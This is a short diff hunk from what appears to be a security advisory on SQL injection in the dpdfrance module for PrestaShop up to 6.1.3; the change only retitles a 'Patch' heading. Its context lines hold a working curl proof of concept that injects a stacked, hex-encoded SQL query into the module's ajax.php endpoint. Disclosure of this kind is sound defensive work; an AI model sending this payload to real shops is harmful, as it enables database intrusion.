@@ -54,7 +54,7 @@ In dpdfrance module for PrestaShop up to 6.1.3, multiple sensitives SQL calls in
 curl -v -X POST -d 'action_ajax_dpdfrance=setAddressOrder&order=1%27;select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--' 'https://domain.tld/modules/dpdfrance/ajax.php?dpdfrance_token=EXPOSED_TOKEN_ON_FRONT_OFFICE'
 ```
 
-## Patch from 6.1.1
+## Patch
 
 ```diff
 --- a/dpdfrance/dpdfrance.php
